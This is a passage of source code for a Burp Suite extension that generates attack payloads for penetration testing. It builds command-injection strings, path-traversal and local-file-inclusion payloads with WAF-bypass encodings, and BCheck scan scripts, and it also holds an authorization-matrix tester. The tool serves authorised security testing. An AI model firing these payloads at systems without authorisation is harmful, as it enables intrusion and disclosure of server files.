# -*- coding: utf-8 -*-
"""
Author: Volkan Dindar
        volkan.dindar@owasp.org
        https://github.com/volkandindar/agartha
"""
try:
    import sys, re, urlparse, random, os, urllib, posixpath, json
    from burp import IBurpExtender, ITab, IMessageEditorController, IContextMenuFactory, IBurpExtenderCallbacks, IExtensionHelpers
    from java.awt import BorderLayout, FlowLayout, Color, Font, Dimension, Toolkit, GridLayout, GridBagLayout, GridBagConstraints, Insets
    from javax.swing import JCheckBox, JMenuItem, JTextPane, JTable, GroupLayout, JScrollPane, JProgressBar, SwingConstants, JComboBox, JButton, JTextField, JSplitPane, JPanel, JLabel, JRadioButton, ButtonGroup, JTabbedPane, BoxLayout, JEditorPane, JList, DefaultListModel, DefaultListSelectionModel, JTextArea, BorderFactory, SwingUtilities, Timer
    from javax.swing.border import EmptyBorder
    from javax.swing.table import DefaultTableModel, TableCellRenderer
    from java.util import ArrayList, Calendar, Locale
    from java.text import SimpleDateFormat
    from threading import Thread
    from java.lang import Runnable
    from java.awt.datatransfer import StringSelection
    from time import sleep
    from java.net import URL, HttpURLConnection
    from java.io import BufferedReader, InputStreamReader
    from java.lang import Thread as JavaThread
    from java.awt.event import MouseWheelListener, FocusListener
    from javax.swing.text import SimpleAttributeSet, StyleConstants, StyleContext
except:
    print "==== ERROR ====" + "\n\nFailed to load dependencies.\n" +str(sys.exc_info()[1]) +"\n\n==== ERROR ====\n\n"
    sys.exit(1)

VERSION = "2.33"
#url_regex = r'(log|sign)([-_+%0-9]{0,5})(off|out|in|on)|(expire|kill|terminat|delete|remove)'
url_regex = r'(log|sign|time)([-_+%0-9]{0,5})(off|out)|(expire|kill|terminat|delete|remove)'
ext_regex = r'^\.(gif|jpg|jpeg|png|css|js|ico|svg|eot|woff2|ttf|otf)$'

class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFactory, IBurpExtenderCallbacks, IExtensionHelpers):
    
    def registerExtenderCallbacks(self, callbacks):
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()
        self._callbacks.setExtensionName("Agartha")
        self._MainTabs = JTabbedPane()
        self._tabDictUI()
        self._tabAuthUI()
        self._tabAuthenticationUI()
        self._tabBambdasUI()
        self._tabHelpUI()
        self._MainTabs.addTab("Payload Generator", None, self._tabDictPanel, None)
        self._MainTabs.addTab("Auth Matrix", None, self._tabAuthSplitpane, None)
        self._MainTabs.addTab("403 Bypass", None, self._tabAuthenticationSplitpane, None)
        self._MainTabs.addTab("Bambdas Generator", None, self._tabBambdasPanel, None)
        self._MainTabs.addTab("Help", None, self._tabHelpJPanel, None)
        callbacks.addSuiteTab(self)
        callbacks.registerContextMenuFactory(self)
        callbacks.issueAlert("The extension has been loaded.")
        print "Agartha(v" + VERSION + ") is a security tool, which specializes in:\n\t\t* Path Traversal, Local File Inclusion (LFI) payload generations\n\t\t* Command Injection, Remote Code Execution (RCE) payload generations\n\t\t* SQL Injection (SQLi) payload generations\n\t\t* BCheck code with all generated payloads is produced in the proper syntax and ready for use with the scanning engine\n\t\t* Auth Matrix, based on user sessions to find authentication/authorization violations\n\t\t* HTTP 403 Bypass, including vertical and horizontal privilege escalations\n\t\t* Copy as Javascript, for further XSS exploitation\n\t\t* Bambdas Script Generation simplifies testing scope management and aids in vulnerability discovery.\n\nFor more information and tutorial, please visit:\n\t\thttps://github.com/volkandindar/agartha\n\nAuthor:\n\t\tVolkan Dindar\n\t\tvolkan.dindar@owasp.org"
        self.reset(self)
        return

    def reset(self, ev):
        t = Thread(target=self.resetThread, args=[self])
        t.start()
        return

    def resetThread(self, ev):
        sleep(1)
        self.tableMatrixReset(self)
        self.resetAuthentication(self)
        return

    def authMatrixThread(self, ev):
        self._cbAuthColoringFunc(self)
        self._requestViewer.setMessage("", False)
        self._responseViewer.setMessage("", False)
        self._lblAuthNotification.text = " "
        self._tbAuthNewUser.setForeground (Color.black)
        self._btnAuthNewUserAdd.setEnabled(False)
        self._btnAuthRun.setEnabled(False)
        self._cbAuthColoring.setEnabled(False)
        self._btnAuthReset.setEnabled(False)
        self._cbAuthGETPOST.setEnabled(False)
        self.progressBar.setValue(0)
        self.httpReqRes = [[],[],[],[],[]]
        self.httpReqRes.append([])
        self.tableMatrix.clearSelection()
        for x in range(0, self.tableMatrix.getRowCount()):
            for y in range(1, self.tableMatrix.getColumnCount()):
                self.tableMatrix.setValueAt("", x, y)
        
        i = 1000000 / ( self.tableMatrix.getRowCount() * (self.tableMatrix.getColumnCount()-1) )

        for x in range(0, self.tableMatrix.getRowCount()):
            for y in range(1, self.tableMatrix.getColumnCount()):
                self.tableMatrix.setValueAt(self.makeHttpCall(self.tableMatrix.getValueAt(x, 0), self.tableMatrix.getColumnName(y)), x, y)
                self.progressBar.setValue(self.progressBar.getValue() + i)
                self._lblAuthNotification.text = "It is still in progress, '" + str(int(self.progressBar.getValue() / 10000))  + "%' has been completed so far."
        
        self._customRenderer = UserEnabledRenderer(self.tableMatrix.getDefaultRenderer(str), self.userNamesHttpUrls, "")
        self._customTableColumnModel = self.tableMatrix.getColumnModel()
        for y in range(0, self.tableMatrix.getColumnCount()):
            self._customTableColumnModel.getColumn(y).setCellRenderer(self._customRenderer)
        self.tableMatrix.repaint()
        self.tableMatrix.setSelectionForeground(Color.red)
        self._btnAuthNewUserAdd.setEnabled(True)
        self._btnAuthRun.setEnabled(True)
        self._cbAuthColoring.setEnabled(True)
        self._btnAuthReset.setEnabled(True)
        self._cbAuthGETPOST.setEnabled(True)
        self.progressBar.setValue(1000000)
        self._lblAuthNotification.text = "Blue, Green, Purple and Beige colors are representation of users. Yellow, Orange and Red cell colors show warning levels."        
        return
    
    def headerAdjustment(self, _header, _url, userID):
        returnMethod = ''
        headerMethod = 'GET'
        header = ""

        if "GET" not in _header[:3]:
            _header = self._helpers.bytesToString(self._callbacks.getHelpers().toggleRequestMethod(_header))
            headerMethod = 'POST'

        histories = self._callbacks.getProxyHistory()[::-1]
        for history in histories:
            url = str(self._helpers.analyzeRequest(history).getUrl())
            if url.startswith("https"):
                url = url.replace(":443/", "/")
            elif url.startswith("http"):
                url = url.replace(":80/", "/")

            if  url == _url:
                if str(self._helpers.analyzeRequest(history.getRequest()).getMethod()) == 'GET':
                    header = str((self._helpers.bytesToString(history.getRequest())).split('\n', 1)[0]).split('\n', 1)[0]
                    returnMethod = 'GET'
                else:
                    header = (self._helpers.bytesToString(self._callbacks.getHelpers().toggleRequestMethod(history.getRequest()))).split('\n', 1)[0]
                    returnMethod = 'POST'
                break
        
        if not returnMethod:
            if headerMethod == 'GET':
                return _header
            else:
                return self._callbacks.getHelpers().toggleRequestMethod(_header)
        elif returnMethod == 'POST':
            _header = _header.replace(_header.split('\n', 1)[0], header)
            return self._callbacks.getHelpers().toggleRequestMethod(_header)
        elif returnMethod == 'GET':
            return _header.replace(_header.split('\n', 1)[0], header)

    def makeHttpCall(self, urlAdd, userID):
        try:
            userID = self.userNames.index(userID)
            header = self.userNamesHttpReq[userID]

            # changing new url path in the request header
            header =  header.replace(str(header.splitlines()[0]), header.splitlines()[0].split(" ", 2)[0] + " /" + urlAdd.split('/',3)[3] + " " + header.splitlines()[0].split(" ", 2)[2])

            # header methods
            if "GET" in header[:3] and self._cbAuthGETPOST.getSelectedIndex() == 1:
                # request was GET and will be in POST
                header = self._callbacks.getHelpers().toggleRequestMethod((header))
            elif "POST" in header[:4] and self._cbAuthGETPOST.getSelectedIndex() == 0:
                # request was POST alike and will be in GET
                header = self._callbacks.getHelpers().toggleRequestMethod((header))
            elif self._cbAuthGETPOST.getSelectedIndex() == 2:
                # request is dynamic, proxy history will be reference
                header = self.headerAdjustment(header, urlAdd, userID)

            portNum = 80
            if urlparse.urlparse(urlAdd).port:
                portNum = urlparse.urlparse(urlAdd).port
            else:
                if urlparse.urlparse(urlAdd).scheme == "https":
                    portNum = 443
    
            _httpReqRes = self._callbacks.makeHttpRequest(self._helpers.buildHttpService(urlparse.urlparse(urlAdd).hostname, portNum, urlparse.urlparse(urlAdd).scheme), header)
            self.httpReqRes[userID].append(_httpReqRes)
            
            return "HTTP " + str(self._helpers.analyzeResponse(self._helpers.bytesToString(_httpReqRes.getResponse())).getStatusCode()) + " : " + format(len(self._helpers.bytesToString(_httpReqRes.getResponse())) - self._helpers.analyzeResponse(self._helpers.bytesToString(_httpReqRes.getResponse())).getBodyOffset(), ',d') + " bytes"
        except:
            return str(sys.exc_info()[1])

    def authAdduser(self, ev):
        if self.userCount == 4:
            self._lblAuthNotification.text = "You can add up to 4 users"
            self._lblAuthNotification.setForeground (Color.red)
            return
        
        if not self._tbAuthURL.getText().strip():
            self._lblAuthNotification.text = "Please provide minimum one URL!"
            self._lblAuthNotification.setForeground (Color.red)
            return

        _validItem = False
        for _url in self._tbAuthURL.getText().split('\n'):
            _url = _url.strip()
            if not self.isURLValid(str(_url)) or _url == self._txtURLDefault:
                self._tbAuthURL.setForeground (Color.red)
                self._lblAuthNotification.text = "URLs should start with 'http/s' and not have any spaces. Please check: '" + _url + "'"
                self._lblAuthNotification.setForeground (Color.red)
                return

            if _url.count("/") == 2:
                _url += "/"
            _ext = os.path.splitext(urlparse.urlparse(_url).path)[1]
            
            if _url and not any(re.findall(url_regex, _url, re.IGNORECASE)) and not any(re.findall(ext_regex, _ext, re.IGNORECASE)):
                _validItem = True
                break
        
        if not _validItem:
            self._lblAuthNotification.text = "No item has been added! User URLs may only have possible session terminators (signout, logoff, etc.), dangerous commands (kill, terminate, delete, etc.), or file types (gif, js, etc.)."
            self._btnAuthReset.setEnabled(True)
            return

        self._tbAuthURL.setForeground (Color.black)

        if not self._tbAuthHeader.getText().strip() or self._tbAuthHeader.getText().strip() == self._txtHeaderDefault:
            self._tbAuthHeader.setForeground (Color.red)
            self._lblAuthNotification.text = "Please provide a valid header!"
            self._lblAuthNotification.setForeground (Color.red)
            return
        self._tbAuthHeader.setForeground (Color.black)

        if self._tbAuthNewUser.text.strip() in self.userNames or not self._tbAuthNewUser.text.strip() or len(self._tbAuthNewUser.text.strip()) > 20:
            self._tbAuthNewUser.setForeground (Color.red)
            self._lblAuthNotification.text = "Please add another user name, that must be unique and less then 20 chars!"
            self._lblAuthNotification.setForeground (Color.red)
            return
        self._tbAuthNewUser.setForeground (Color.black)

        if self.userCount == 0:
            # header for unauth user
            unauthHeader = self._tbAuthHeader.getText().split('\n')[0] + "\n" + self._tbAuthHeader.getText().split('\n')[1]
            for line in self._tbAuthHeader.getText().split('\n')[2:]:
                if not any(re.findall(r'(cookie|token|auth)(.*:)', line, re.IGNORECASE)):
                    unauthHeader +=  "\n" + line
                if not line:
                    break
            self.userNamesHttpReq[0] = unauthHeader
        
        self.userCount = self.userCount + 1
        self.userNames.append(self._tbAuthNewUser.text.strip())
        self.userNamesHttpReq.append(self._tbAuthHeader.getText())
        self.tableMatrix_DM.addColumn(self._tbAuthNewUser.text.strip())
        self.userNamesHttpUrls.append([])

        urlList = []
        for x in range(0, self.tableMatrix.getRowCount()):
            urlList.append(str(self.tableMatrix.getValueAt(x, 0)))
        for _url in set(self._tbAuthURL.getText().split('\n')):
            _url = _url.strip()
            if _url.count("/") == 2:
                _url += "/"
            _ext = os.path.splitext(urlparse.urlparse(_url).path)[1]
            if _url and not any(re.findall(url_regex, _url, re.IGNORECASE)) and not any(re.findall(ext_regex, _ext, re.IGNORECASE)):
                # ignore logout, signoff, etc. paths
                if _url not in self.userNamesHttpUrls[self.userCount]:
                    # check first if the url exist in user's url list
                    self.userNamesHttpUrls[self.userCount].append(_url)
                    if _url not in urlList:
                        # check table if url exists
                        self.tableMatrix_DM.addRow([_url])
        
        self._tbAuthURL.setText(self._tbAuthURL.getText().split('\n')[0]+"\n")
        self._btnAuthRun.setEnabled(True)
        self._btnAuthReset.setEnabled(True)
        self._lblAuthNotification.text = "'" + self._tbAuthNewUser.text.strip() + "' added successfully! Possible session terminators (signout, logoff, etc.), dangerous commands (kill, terminate, delete, etc.), and file types (gif, js, etc.) have been filtered out!"
        self._lblAuthNotification.setForeground (Color.black)
        self._cbAuthColoring.setEnabled(True)
        self._cbAuthGETPOST.setEnabled(True)
        self.tableMatrix.repaint()
        self.tableMatrix.setSelectionForeground(Color.red)
        self._customRenderer = UserEnabledRenderer(self.tableMatrix.getDefaultRenderer(str), self.userNamesHttpUrls, "")
        self._customTableColumnModel = self.tableMatrix.getColumnModel()
        for y in range(0,self.tableMatrix.getColumnCount()):
            self._customTableColumnModel.getColumn (y).setCellRenderer (self._customRenderer)
        
        return

    def _cbAuthColoringFunc(self, ev):
        global _colorful
        if self._cbAuthColoring.isSelected():
            _colorful = True
        else:
            _colorful = False

        self.tableMatrix.repaint()
        return

    def _cbUnionBasedFunc(self, ev):
        if self._cbUnionBased.isSelected(): 
            self._cbUnionDepth.setEnabled(True)
        else:
            self._cbUnionDepth.setEnabled(False)
        return

    def funcGeneratePayloadForBCheck(self, ev):
        if self.funcGeneratePayload(self):
            line_count = len([line for line in self._tabDictResultDisplay.getText().split('\n') if line.strip()])
            if self._rbDictCommandInj.isSelected():
                bcheckCode= """
metadata:
    language: v2-beta
    name: "Command Injection (RCE) Fuzzing - Agartha"
    description: "Command Injection is a security flaw where attackers execute unauthorized commands on a system by exploiting unvalidated user input."
    author: "Agartha - Auto-Generated BCheck Code"
    tags: "RCE", "RCE Injection"

define:
    issueDetail = `Command Injection on Path {latest.request.url}`
    references = `
    References:
    https://portswigger.net/web-security/os-command-injection
    https://owasp.org/www-community/attacks/Command_Injection
    https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html`
    issueRemediation = `Command Injection (RCE): To remediate Command Injection (RCE) issues, developers should adopt best practices such as using parameterized queries or prepared statements, which ensure user inputs are treated as data rather than executable code. Validating and sanitizing all user inputs to filter out malicious characters and patterns is essential. Running web applications with the least privileges necessary can limit the impact of potential exploits. Implementing robust error handling and avoiding the display of detailed error messages can prevent attackers from gaining insights into the system. Regular security audits and code reviews are crucial to identify and address potential vulnerabilities early on. By integrating these practices into the development lifecycle, organizations can significantly mitigate the risk of Command Injection attacks and enhance their overall security posture.
     {references}`

run for each:
    payloads=
"""
            elif self._rbDictLFI.isSelected():
                bcheckCode= """
metadata:
    language: v2-beta
    name: "LFI Injection Fuzzing - Agartha"
    description: "Local File Inclusion (LFI) is a security vulnerability where attackers can access and execute files on a server by exploiting improper input validation. This can lead to unauthorized access to sensitive data and system compromise."
    author: "Agartha - Auto-Generated BCheck Code"
    tags: "LFI", "LFI Injection"

define:
    issueDetail = `Local File Inclusion on Path {latest.request.url}`
    references = `
    References:
    https://portswigger.net/web-security/file-path-traversal
    https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion`
    issueRemediation = `Local File Inclusion (LFI): To remediate LFI issues, developers should validate and sanitize all user inputs, ensuring only expected characters are allowed and rejecting suspicious patterns. Implementing a whitelist of allowed files and directories can prevent unauthorized access. Running web applications with the least privileges necessary can limit the impact of potential exploits. Robust error handling and avoiding the display of detailed error messages can prevent attackers from gaining insights into the system. Regular security audits and code reviews are crucial to identify and address potential vulnerabilities early on. By integrating these practices into the development lifecycle, organizations can significantly mitigate the risk of LFI attacks and enhance their overall security posture.
     {references}`

run for each:
    payloads=
"""
            elif self._rbDictSQLi.isSelected():
                bcheckCode= """
metadata:
    language: v2-beta
    name: "SQL Injection Fuzzing - Agartha"
    description: "SQL injection is a security vulnerability where attackers insert malicious SQL code into a query, allowing them to manipulate or access the database improperly."
    author: "Agartha - Auto-Generated BCheck Code"
    tags: "SQLi", "SQL Injection"

define:
    issueDetail = `SQL Injection on Path {latest.request.url}`
    references = `
    References:
    https://portswigger.net/web-security/sql-injection
    https://owasp.org/www-community/attacks/SQL_Injection
    https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html`
    issueRemediation = `SQL injection is a critical security vulnerability that allows attackers to manipulate and execute unauthorized SQL queries, potentially compromising the integrity and confidentiality of a database. To remediate SQL injection, developers should adopt best practices such as using parameterized queries or prepared statements, which ensure that user inputs are treated as data rather than executable code. Additionally, employing stored procedures can help encapsulate SQL logic and reduce direct interaction with the database. Input validation and sanitization are essential to filter out malicious characters and patterns. Implementing robust error handling and avoiding the display of detailed error messages can prevent attackers from gaining insights into the database structure. Regular security audits and code reviews are also crucial to identify and address potential vulnerabilities early on. By integrating these practices into the development lifecycle, organizations can significantly mitigate the risk of SQL injection attacks and enhance their overall security posture.
     {references}`

run for each:
    payloads=
"""
            text = self._tabDictResultDisplay.getText()
            lines = text.split('\n')
            formatted_lines = ['\t"{}"'.format(line.replace('"', '\\"')) + ',' for line in lines if line.strip()]
            bcheckCode += '\n'.join(formatted_lines)
            bcheckCode = bcheckCode[:-1] + "\n"

            if self._rbDictSQLi.isSelected() or self._rbDictCommandInj.isSelected():
                bcheckCode += """
given any insertion point then
    send payload called payloadReplacing:
        replacing: {payloads}
    send payload called payloadAppending:
        appending: {payloads}

    if {payloadReplacing.response.status_code} is "200" then
      # For more precise detections
      # if ("condition1" in {payloadReplacing.response.body} and "condition2" in {payloadReplacing.response.body}) or ("condition3" in {payloadReplacing.response.body} and "condition4" in {payloadReplacing.response.body}) then
        report issue and continue:
            severity: medium
            confidence: tentative
            detail: `Injected parameter: {payloads}, at {payloadReplacing.request.url.path}`
            remediation: {issueRemediation}
      # end if
    end if

    if {payloadAppending.response.status_code} is "200" then
      # For more precise detections
      # if ("condition1" in {payloadAppending.response.body} and "condition2" in {payloadAppending.response.body}) or ("condition3" in {payloadAppending.response.body} and "condition4" in {payloadAppending.response.body}) then
        report issue and continue:
            severity: medium
            confidence: tentative
            detail: `Injected parameter: {payloads}, at {payloadAppending.request.url.path}`
            remediation: {issueRemediation}
      # end if
    end if
"""
            elif self._rbDictLFI:
                bcheckCode += """
given request then
    # replacing url partially
    send request called payloadReplacingPartially:
        replacing path: `{regex_replace({regex_replace({base.request.url}, "^.*?\\/.*?\\/.*?\\/", "/")}, "([^/]+)$", "")}{payloads}`
    if {payloadReplacingPartially.response.status_code} is "200" then
        # For more precise detections
        # if ("localhost" in {payloadReplacingPartially.response.body} and "127.0.0.1" in {payloadReplacingPartially.response.body}) or ("localhost" in {payloadReplacingPartially.response.body} and "127.0.0.1" in {payloadReplacingPartially.response.body}) then
            report issue and continue:
            severity: medium
            confidence: tentative
            detail: `Injected parameter: {payloads}, at {payloadReplacingPartially.request.url.path}`
            remediation: {issueRemediation}
        # end if
    end if

    # replacing query string in URL, if it exists.
    if ({base.request.url.file} matches ".*[?].*[=].*") then
        send request called payloadReplacingQueryString:
            replacing queries: `{regex_replace({base.request.url.query}, "([^&=]+)=([^&]*)", "$1=")}{payloads}`
        if {payloadReplacingQueryString.response.status_code} is "200" then
            # For more precise detections
            # if ("localhost" in {payloadReplacingQueryString.response.body} and "127.0.0.1" in {payloadReplacingQueryString.response.body}) or ("localhost" in {payloadReplacingQueryString.response.body} and "127.0.0.1" in {payloadReplacingQueryString.response.body}) then
                report issue and continue:
                severity: medium
                confidence: tentative
                detail: `Injected parameter: {payloads}, at {payloadReplacingQueryString.request.url.path}`
                remediation: {issueRemediation}
            # end if
        end if
    end if

    # replacing the whole url
    #send request called payloadReplacingFull:
    #    replacing path: `{regex_replace({base.request.url}, "^.*", "")}/{payloads}`
    #if {payloadReplacingFull.response.status_code} is "200" then
    #    # For more precise detections
    #    # if ("localhost" in {payloadReplacingFull.response.body} and "127.0.0.1" in {payloadReplacingFull.response.body}) or ("localhost" in {payloadReplacingFull.response.body} and "127.0.0.1" in {payloadReplacingFull.response.body}) then
    #        report issue and continue:
    #        severity: medium
    #        confidence: tentative
    #        detail: `Injected parameter: {payloads}, at {payloadReplacingFull.request.url.path}`
    #        remediation: {issueRemediation}
    #    # end if
    #end if
"""
            self._tabDictResultDisplay.setText(bcheckCode)
            clipboard = Toolkit.getDefaultToolkit().getSystemClipboard()
            clipboard.setContents(StringSelection(self._tabDictResultDisplay.getText()), None)
            self._lblStatusLabel.setText('BCheck Code has generated with ' + str(line_count) + ' payloads, and has been copied to your clipboard!')
        
        return

    def funcGeneratePayload(self, ev):
        self._lblStatusLabel.setForeground (Color.red)
        self._tabDictResultDisplay.setText("")
        if self._rbDictSQLi.isSelected():            
            self._txtTargetPath.setText(self._txtDefaultSQLi)
        elif not self.isValid():
            if self._rbDictLFI.isSelected():
                self._lblStatusLabel.setText("File input is not valid. "+ self._txtDefaultLFI)
                self._txtTargetPath.setText(random.choice(["/etc/hosts", "C:\\windows\\system32\\drivers\\etc\\hosts"]))
            elif self._rbDictCommandInj.isSelected():
                self._lblStatusLabel.setText("Command input is not valid. " + self._txtDefaultCommandInj)
                self._txtTargetPath.setText(random.choice(["sleep 120", "timeout 120"]))
            return False

        self._lblStatusLabel.setForeground (Color.black)
        self._txtTargetPath.text = self._txtTargetPath.text.strip()
        self._lblStatusLabel.setText("")
        if self._rbDictCommandInj.isSelected():
            self.funcCommandInj(self)
        if self._rbDictLFI.isSelected():
            self.funcLFI(self)
        if self._rbDictSQLi.isSelected():
            self.funcSQLi(self)
        return True
       
    def isValid(self):
        # input should not be empty, should contain at least one alphanumeric char and less than 250 length
        if self._txtTargetPath.text.strip() and re.compile("[0-9a-zA-Z]").findall(self._txtTargetPath.text) and self._txtTargetPath.text.strip() !=self._txtDefaultLFI and self._txtTargetPath.text.strip() !=self._txtDefaultCommandInj and len(self._txtTargetPath.text.strip()) < 250:
            return True
        else:
            return False

    def funcRBSelection(self, ev):
        self._lblStatusLabel.setForeground (Color.black)
        self._lblStatusLabel.setText("")
        self._tabDictPanel_LFI.setVisible(False)
        self._cbDictCommandInjOpt.setVisible(False)
        self._tabDictPanel_SQLType.setVisible(False)
        self._tabDictPanel_SQLi.setVisible(False)
        self._tabDictPanel_SQLOptions.setVisible(False)
        self._tabDictResultDisplay.setText("")
        if self._rbDictLFI.isSelected():
            self._txtTargetPath.setText(self._txtDefaultLFI)
            self._tabDictResultDisplay.setText(self._txtCheatSheetLFI)
            self._tabDictPanel_LFI.setVisible(True)
            self._lblStatusLabel.setText("Please provide a path to generate payloads!")
        elif self._rbDictCommandInj.isSelected():
            self._txtTargetPath.setText(self._txtDefaultCommandInj)
            self._tabDictResultDisplay.setText(self._txtCheatSheetCommandInj)
            self._cbDictCommandInjOpt.setVisible(True)
            self._lblStatusLabel.setText("Please provide a command to generate payloads!")
        elif self._rbDictSQLi.isSelected():
            self._txtTargetPath.setText(self._txtDefaultSQLi)
            self._tabDictPanel_SQLType.setVisible(True)
            self._tabDictPanel_SQLi.setVisible(True)
            self._tabDictPanel_SQLOptions.setVisible(True)
            self.funcSQLi(self)
        return

    def funcCommandInj(self, ev):
        listCommandInj = []        
        prefixes = ["", "\\n", "\\\\n", "\\r\\n", "\\\\r\\\\n", "%0a", "%0d%0a"]
        escapeChars = ["",  "'", "\\'", "\\\\'", "\"", "\\\"", "\\\\\""]
        separators = ["&", "&&", "|", "||", ";"]
        
        for prefix in prefixes:
            for escapeChar in escapeChars:
                if (prefix[:2].count("\\")) and (escapeChar[:2].count("\\")):
                    if (prefix[:2].count("\\") != escapeChar[:2].count("\\")):
                        continue
                for separator in separators:
                    listCommandInj.append(prefix + escapeChar + separator + self._txtTargetPath.text + separator + escapeChar + "\n")
                    listCommandInj.append(prefix + escapeChar + separator + self._txtTargetPath.text + escapeChar + "\n")
                    listCommandInj.append(prefix + escapeChar + separator + escapeChar + self._txtTargetPath.text + "\n")
                    listCommandInj.append(prefix + escapeChar + separator + "`" + self._txtTargetPath.text + "`" + separator + escapeChar + "\n")
                    listCommandInj.append(prefix + escapeChar + separator + "`" + self._txtTargetPath.text + "`" + escapeChar + "\n")
                listCommandInj.append(prefix + separator + "`" + self._txtTargetPath.text + "`" + separator + "\n")
                listCommandInj.append(prefix + separator + "`" + self._txtTargetPath.text + "`" + "\n")
            listCommandInj.append(prefix + self._txtTargetPath.text + "\n")
            listCommandInj.append(prefix + "`" + self._txtTargetPath.text + "`" + "\n")

        listCommandInj = list(set(listCommandInj))
        listCommandInj.sort(reverse=True)
        
        if self._cbDictCommandInjEncoding.isSelected():
            listCommandInj = self.encodeURL(listCommandInj)
        
        self._tabDictResultDisplay.setText(''.join(map(str, listCommandInj)))
        clipboard = Toolkit.getDefaultToolkit().getSystemClipboard()
        clipboard.setContents(StringSelection(self._tabDictResultDisplay.getText()), None)
        self._lblStatusLabel.setText('Payload list for "' + self._txtTargetPath.text + '" command returns with '+ str(len(listCommandInj)) + ' result, and they have been copied to your clipboard!')
        return

    def funcLFI(self, ev):
        listLFI = []
        dept = int(self._cbDictDepth.getSelectedItem())
        
        if self._txtTargetPath.text.startswith('/') or self._txtTargetPath.text.startswith('\\'):
            self._txtTargetPath.text = self._txtTargetPath.text[1:]
        
        filePath = self._txtTargetPath.text.replace("\\","/")
        
        counter = 0
        if self._cbDictEquality.isSelected():
            counter = dept

        while counter <= dept:
            _upperDirectory = ""
            i = 1
            while i <= counter:
                _upperDirectory += "../"
                i = i + 1
                listLFI.append(_upperDirectory + filePath + "\n")

            if self._cbDictWafBypass.isSelected():
                suffixes = ["", ";index.html", "%00", "%00.html", "%0a", "%0a.html", "%0d", "%0d.html", "%09", "%09.html"]
                for suffix in suffixes:
                    listLFI.append((_upperDirectory + filePath).replace("..", "...") + suffix + "\n")
                    listLFI.append((_upperDirectory + filePath).replace("..", "....") + suffix + "\n")
                    listLFI.append((_upperDirectory + filePath).replace("..", "..;") + suffix + "\n")
                    listLFI.append((_upperDirectory + self._txtTargetPath.text).replace("..", "...") + suffix + "\n")
                    listLFI.append((_upperDirectory + self._txtTargetPath.text).replace("..", "....") + suffix + "\n")
                    listLFI.append((_upperDirectory + self._txtTargetPath.text).replace("..", "..;") + suffix + "\n")

                prefixes = ["/", "\\", "/..;/", "..;/", ".//"]
                for prefix in prefixes:
                    suffixes = ["", ";index.html", "%00", "%00.html", "%0a", "%0a.html", "%0d", "%0d.html", "%09", "%09.html"]
                    for suffix in suffixes:
                        listLFI.append(prefix + _upperDirectory + filePath + suffix + "\n")
                        if not "\\" in prefix and not "/..;/" in prefix :
                            listLFI.append(_upperDirectory + prefix + filePath + suffix + "\n")


                if "\\" in self._txtTargetPath.text:
                    suffixes = ["", ";index.html", "%00", "%00.html", "%0a", "%0a.html", "%0d", "%0d.html", "%09", "%09.html"]
                    for suffix in suffixes:
                        listLFI.append(_upperDirectory.replace("/", "\\") + self._txtTargetPath.text + suffix + "\n")
                        listLFI.append(_upperDirectory.replace("/", "\\").replace("..", "...") + self._txtTargetPath.text + suffix + "\n")
                        listLFI.append(_upperDirectory.replace("/", "\\").replace("..", "....") + self._txtTargetPath.text + suffix + "\n")
                        listLFI.append(_upperDirectory.replace("/", "\\\\") + self._txtTargetPath.text + suffix + "\n")
                        listLFI.append((_upperDirectory + filePath).replace("/", "\\\\") + suffix + "\n")
                        listLFI.append(_upperDirectory + self._txtTargetPath.text.replace("/", "\\\\") + suffix + "\n")
                        listLFI.append((_upperDirectory + filePath).replace("/", "\\") + suffix + "\n")

                _slashes = ["..././", "...\\.\\"]
                for _slash in _slashes:
                    suffixes = ["", ";index.html", "%00", "%00.html", "%0a", "%0a.html", "%0d", "%0d.html", "%09", "%09.html"]
                    for suffix in suffixes:
                        listLFI.append(_upperDirectory.replace("../", _slash) + filePath + suffix + "\n")

                _slashes = ["\\", "\\\\", "\\\\\\", "//", "///", "\\/"]
                for _slash in _slashes:
                    suffixes = ["", ";index.html", "%00", "%00.html", "%0a", "%0a.html", "%0d", "%0d.html", "%09", "%09.html"]
                    for suffix in suffixes:
                        listLFI.append(_upperDirectory.replace("/", _slash) + filePath + suffix + "\n")
                        listLFI.append(_upperDirectory.replace("/", _slash) + self._txtTargetPath.text + suffix + "\n")                    
                        if "\\" in self._txtTargetPath.text:
                            listLFI.append(_upperDirectory[:-1].replace("/", _slash) + "\\" + self._txtTargetPath.text + suffix + "\n")
                        else:
                            listLFI.append(_upperDirectory[:-1].replace("/", _slash) + "/" + filePath + suffix + "\n")
                        listLFI.append((_upperDirectory + filePath).replace("/", _slash) + suffix + "\n")


                _slashes = ["%2f", "%5c"   , "%252f"     , "%255c"     , "%c1%9c"      , "%c0%af"]
                _dots = ["%2e%2e", "%2e%2e", "%252e%252e", "%252e%252e", "%c0%2e%c0%2e", "%c0%2e%c0%2e"]
                suffixes = ["", ";index.html", "%00", "%00.html", "%0a", "%0a.html", "%0d", "%0d.html", "%09", "%09.html"]

                for i in range(len(_slashes)):
                    if _slashes[i].startswith("%c") or _slashes[i].startswith("%25"):
                        listLFI.append((_upperDirectory).replace("/", _slashes[i]) + filePath + "\n")
                        listLFI.append((_upperDirectory)[:-1].replace("/", _slashes[i]) + "/" + filePath + "\n")
                        listLFI.append((_upperDirectory + filePath).replace("/", _slashes[i]) + "\n")
                        listLFI.append((_upperDirectory).replace("/", _slashes[i]).replace("..", _dots[i]) + filePath + "\n")
                        listLFI.append((_upperDirectory)[:-1].replace("/", _slashes[i]).replace("..", _dots[i]) + "/" + filePath + "\n")
                        listLFI.append((_upperDirectory + filePath).replace("/", _slashes[i]).replace("..", _dots[i]) + "\n")                    
                        listLFI.append((_upperDirectory).replace("..", _dots[i]) + filePath + "\n")
                    else:
                        for suffix in suffixes:
                            listLFI.append((_upperDirectory).replace("/", _slashes[i]) + filePath + suffix + "\n")
                            listLFI.append((_upperDirectory)[:-1].replace("/", _slashes[i]) + "/" + filePath + suffix + "\n")
                            listLFI.append((_upperDirectory + filePath).replace("/", _slashes[i]) + suffix + "\n")
                            listLFI.append((_upperDirectory).replace("/", _slashes[i]).replace("..", _dots[i]) + filePath + suffix + "\n")
